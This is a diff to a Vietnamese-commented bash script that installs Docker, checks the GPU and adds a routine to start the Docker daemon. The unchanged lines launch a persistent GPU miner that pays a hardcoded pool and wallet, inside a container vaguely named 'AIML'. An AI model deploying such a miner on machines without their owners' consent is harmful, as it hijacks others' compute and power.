@@ -32,6 +32,16 @@ install_docker() {
     apt-get install -y docker-ce docker-ce-cli containerd.io
 }
 
+# Kiểm tra nếu Docker daemon đang chạy
+check_docker_running() {
+    if ! sudo systemctl is-active --quiet docker; then
+        echo "Docker daemon is not running. Starting Docker..."
+        sudo systemctl start docker
+    else
+        echo "Docker daemon is already running."
+    fi
+}
+
 # Kiểm tra GPU trước khi chạy mining
 echo "Kiểm tra GPU..."
 docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi
@@ -45,6 +55,9 @@ else
     echo "Docker đã được cài đặt."
 fi
 
+# Kiểm tra xem Docker daemon có đang chạy không, nếu không thì khởi động nó
+check_docker_running
+
 # Dừng & xóa container cũ nếu đang chạy
 docker stop AIML 2>/dev/null
 docker rm AIML 2>/dev/null
@@ -52,6 +65,7 @@ docker rm AIML 2>/dev/null
 # Chạy Docker container mining với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
 docker run --gpus all -d --restart unless-stopped --name AIML \
     anhacvai/miningrvn:v1 /bin/bash -c "./nbminer -a kawpow -o stratum+tcp://13.80.123.149:3333 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.0"
+
 # Đợi một chút trước khi vào vòng lặp kiểm tra
 sleep 10
 
